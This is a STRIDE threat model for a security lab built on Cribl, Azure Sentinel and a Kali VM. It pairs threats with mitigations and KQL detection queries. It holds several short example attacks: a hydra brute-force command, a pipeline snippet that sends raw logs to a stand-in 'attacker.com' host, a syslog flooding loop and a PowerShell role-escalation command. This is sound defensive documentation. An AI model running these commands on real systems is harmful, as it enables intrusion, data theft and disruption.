# Threat Model - STRIDE Analysis for Cyber Lab Playground

## Executive Summary

This document presents a comprehensive STRIDE threat model for the Cyber Lab Playground infrastructure. It identifies potential threats across authentication, data flows, and system boundaries while providing risk mitigation strategies.

## STRIDE Framework Overview

**STRIDE** - Microsoft's threat modeling methodology:
- **S**poofing of Identity
- **T**ampering with Data  
- **R**epudiation of Actions
- **I**nformation Disclosure
- **D**enial of Service
- **E**levation of Privilege

---

## 1. System Architecture Components

### Data Flow Diagram (DFD) Level 0

```
┌─────────────────────────────────────────────────────────┐
│                    User Workstations                     │
│  (Attacker Lab, Blue Team Analyst, Red Team Operator)  │
└──────────────────────┬──────────────────────────────────┘
                       │
                ┌──────▼──────┐
                │  VPN/Proxy  │ (Security Boundary)
                └──────┬──────┘
                       │
        ┌──────────────┼──────────────┐
        │              │              │
   ┌────▼────┐   ┌────▼────┐   ┌────▼─────┐
   │  Cribl   │   │ Sentinel│   │ Kali VM  │
   │Ingestion │   │ Backend │   │(Red Team)│
   └────┬────┘   └────┬────┘   └────┬─────┘
        │              │             │
        └──────────────┼─────────────┘
                       │
                 ┌─────▼─────┐
                 │Data Store │
                 │(Test Only) │
                 └───────────┘
```

---

## 2. Threat Analysis by STRIDE Category

### 2.1 SPOOFING OF IDENTITY

#### Threat 2.1.1: Credential Spoofing - Weak Authentication Mechanisms
**Severity: HIGH**

**Threat Description:**
Attacker could spoof legitimate users by exploiting weak authentication to Cribl or Sentinel interfaces.

**Attack Vector:**
```bash
# Brute force attack against authentication endpoints
hydra -l admin -P passwords.txt http://lab-cribl:8000/login -V
```

**Impact:**
- Unauthorized access to data ingestion pipelines
- Potential manipulation of detection rules
- Exposure of sensitive lab data

**Risk Level:** 8/10

**Mitigation:**
1. Implement Multi-Factor Authentication (MFA) for all admin accounts
2. Use strong password policies (minimum 16 characters, complexity requirements)
3. Implement rate limiting on authentication endpoints
4. Monitor failed authentication attempts (alert on >5 failures per minute)

**Detection Rule:**
```kql
let auth_table = SecurityEvent
| where EventID == 4625 // Failed login
| summarize FailureCount = count() by Account, TargetUserName, Computer, bin(TimeGenerated, 1m)
| where FailureCount >= 5
```

---

#### Threat 2.1.2: Service Account Impersonation
**Severity: MEDIUM**

**Description:** Service accounts used for Cribl ingestion could be compromised and impersonated.

**Mitigation:**
1. Rotate service account credentials every 90 days
2. Use certificate-based authentication where possible
3. Implement least privilege access (read-only permissions)
4. Monitor service account login patterns for anomalies

---

### 2.2 TAMPERING WITH DATA

#### Threat 2.2.1: Pipeline Configuration Tampering
**Severity: CRITICAL**

**Threat Description:**
Attacker with access to Cribl could modify ingestion pipelines to:
- Inject malicious payloads into normalized logs
- Remove detection rules from being evaluated
- Exfiltrate sensitive data

**Attack Scenario:**
```yaml
# Malicious transformation in Cribl pipeline
fields:
  - add_field:
      target: internal_exfil
      value: '${http.post("attacker.com/exfil", _raw)}'  # Data exfiltration
```

**Risk Level:** 9/10

**Mitigation:**
1. Implement version control for all pipeline configurations (Git)
2. Require code review and approval for production changes
3. Use read-only mode for non-admin users
4. Implement configuration integrity monitoring
5. Audit all pipeline modifications with change logs

**Detection Query:**
```kql
let baseline_pipelines = dynamic(["auth-parser", "network-parser"]);
CriblAuditLog
| where Operation == "PipelineModified"
| where PipelineName !in (baseline_pipelines)
| summarize Changes = count() by PipelineName, Actor, bin(TimeGenerated, 1h)
| where Changes > 0
```

---

#### Threat 2.2.2: Detection Rule Tampering
**Severity: CRITICAL**

**Description:** Malicious actor disables security detection rules in Azure Sentinel.

**Attack Example:**
```kql
// Attacker modifies rule to always return false
let is_suspicious = false; // Original: suspicious_pattern_detected()
```

**Mitigation:**
1. Enable Sentinel rule versioning and rollback capabilities
2. Implement role-based access control (RBAC) for rule modifications
3. Require approval workflow for rule changes
4. Monitor rule modification audit logs
5. Implement canary deployments for rule testing

---

### 2.3 REPUDIATION OF ACTIONS

#### Threat 2.3.1: Attackerification of Audit Logs
**Severity: HIGH**

**Description:** Attacker clears or modifies audit logs to hide malicious activity.

**Mitigation:**
1. Implement immutable audit logs (write-once storage)
2. Forward logs to centralized SIEM (Azure Sentinel) in real-time
3. Enable file integrity monitoring on log files
4. Store log backups in separate, restricted storage
5. Implement log deletion alerts

**Monitoring:**
```kql
SecurityEvent
| where EventID == 517 // Security log cleared
| extend Severity = "Critical"
| project TimeGenerated, Computer, TargetUserName, Severity
```

---

### 2.4 INFORMATION DISCLOSURE

#### Threat 2.4.1: Sensitive Data Exposure in Logs
**Severity: MEDIUM**

**Description:** Sensitive data (passwords, tokens, PII) exposed in normalized logs.

**Examples:**
```
log_entry: "User 'admin' failed to authenticate with password '12345Pass!'"
log_entry: "API token: sk-1234567890abcdef exposed in debug logs"
```

**Mitigation:**
1. Implement data masking/redaction in Cribl pipelines
2. Use regex patterns to identify and redact sensitive data
3. Implement field-level encryption for sensitive data at rest
4. Implement role-based access control (RBAC) to sensitive queries

**Cribl Masking Rule:**
```json
{
  "field": "password",
  "type": "mask",
  "pattern": "(?<=password[=:])\\S+",
  "replacement": "***REDACTED***"
}
```

---

#### Threat 2.4.2: Lab Credentials Exposure
**Severity: HIGH**

**Description:** Lab service account credentials committed to Git repository or exposed in CI/CD logs.

**Mitigation:**
1. Use `.gitignore` to prevent credential commits
2. Implement Git hooks to scan for secrets
3. Use GitHub Secrets for sensitive credentials
4. Implement secret rotation policies
5. Use temporary credentials with short TTLs

---

### 2.5 DENIAL OF SERVICE

#### Threat 2.5.1: Log Ingestion DoS
**Severity: MEDIUM**

**Description:** Attacker floods Cribl with massive log volume, overwhelming ingestion capacity.

**Attack:**
```bash
# Generate high-volume syslog events
while true; do
  logger -h lab-syslog "malicious log event $(date +%s)"
done
```

**Risk:** Resource exhaustion, dropped logs, missed detections

**Mitigation:**
1. Implement rate limiting per source IP
2. Deploy queue-based buffering with backpressure
3. Implement volume-based throttling
4. Monitor Cribl resource utilization (CPU, memory, disk)
5. Implement alerting for unusual ingestion patterns

**Monitoring:**
```kql
CriblMetrics
| where MetricName == "InputVolume"
| summarize AvgVolume = avg(Value) by SourceIP, bin(TimeGenerated, 5m)
| where AvgVolume > 100000 // Threshold: 100K EPS
```

---

#### Threat 2.5.2: Detection Rule DoS
**Severity: MEDIUM**

**Description:** Complex KQL queries consume excessive Sentinel resources, causing timeouts.

**Mitigation:**
1. Implement query performance budgets
2. Use summary/materialized views for frequently accessed data
3. Implement query timeout limits (max 5 minutes)
4. Optimize queries using indexes and partitions
5. Implement query performance monitoring

---

### 2.6 ELEVATION OF PRIVILEGE

#### Threat 2.6.1: Privilege Escalation via Misconfigured RBAC
**Severity: CRITICAL**

**Description:** Attacker escalates from analyst role to admin through RBAC misconfiguration.

**Attack Vector:**
```powershell
# Attempt to modify Sentinel role assignments
New-AzRoleAssignment -ObjectId $analysisUserObjectId `
  -RoleDefinitionName "Sentinel Contributor" `
  -Scope $sentinelWorkspaceId
```

**Mitigation:**
1. Implement least privilege RBAC:
   - **Security Analyst**: Read-only access to alerts/queries
   - **SOC Manager**: Modify existing rules, manage workflows
   - **Security Admin**: Full access (MFA + Approval required)
2. Implement Privileged Identity Management (PIM)
3. Require approval for elevated role activation
4. Implement time-limited role assignments (max 8 hours)
5. Monitor and alert on privilege elevation events

**Detection Rule:**
```kql
AzureActivity
| where OperationName contains "Create Role Assignment" or
        OperationName contains "Update Role Assignment"
| where Properties contains "Sentinel" or Properties contains "Reader"
| extend RiskLevel = iff(Properties contains "Contributor", "High", "Medium")
| project TimeGenerated, Caller, OperationName, RiskLevel
```

---

#### Threat 2.6.2: Container Escape (Red Team VM)
**Severity: CRITICAL**

**Description:** Attacker escapes from isolated Kali VM to host system.

**Mitigation:**
1. Run Kali VM in isolated network segment
2. Disable shared folders and clipboard sharing
3. Implement strict firewall rules
4. Use mandatory access control (MAC) policies
5. Monitor container runtime for escape attempts
6. Regular security updates for hypervisor

---

## 3. Risk Matrix

| Threat | Likelihood | Impact | Risk | Mitigation Priority |
|--------|-----------|--------|------|--------------------|
| Credential Spoofing | Medium | High | 8 | HIGH |
| Pipeline Tampering | Low | Critical | 9 | CRITICAL |
| Detection Rule Tampering | Low | Critical | 9 | CRITICAL |
| Audit Log Modification | Low | High | 7 | HIGH |
| Data Exposure | Medium | Medium | 6 | MEDIUM |
| Log Ingestion DoS | Low | Medium | 5 | MEDIUM |
| Privilege Escalation | Low | Critical | 9 | CRITICAL |
| Container Escape | Very Low | Critical | 8 | HIGH |

---

## 4. Recommended Controls

### Immediate (1-2 weeks)
- [ ] Enable MFA for all administrative accounts
- [ ] Implement RBAC least privilege policies
- [ ] Enable audit logging for all services
- [ ] Deploy secret scanning in Git

### Short-term (1 month)
- [ ] Implement pipeline version control and code review
- [ ] Deploy detection rule approval workflow
- [ ] Implement data masking in Cribl
- [ ] Enable immutable audit logs

### Medium-term (3 months)
- [ ] Implement PIM for privileged access
- [ ] Deploy advanced threat detection
- [ ] Conduct security testing
- [ ] Implement container runtime security

---

## 5. Continuous Monitoring

```kql
// Unified threat monitoring dashboard
let threats = union
  (SecurityEvent | where EventID == 4625 | extend ThreatType = "AuthFailure"),
  (AzureActivity | where OperationName contains "Modified" | extend ThreatType = "ConfigChange"),
  (SecurityEvent | where EventID == 517 | extend ThreatType = "AuditLogCleared")
;
threats
| summarize EventCount = count() by ThreatType, bin(TimeGenerated, 1h)
| extend RiskAlert = iff(EventCount > 100, "ALERT", "OK")
```

---

## References

- Microsoft STRIDE Threat Modeling: https://learn.microsoft.com/security/threat-modeling-tool
- MITRE ATT&CK Framework: https://attack.mitre.org
- CWE Top 25: https://cwe.mitre.org
- OWASP Top 10: https://owasp.org/Top10/
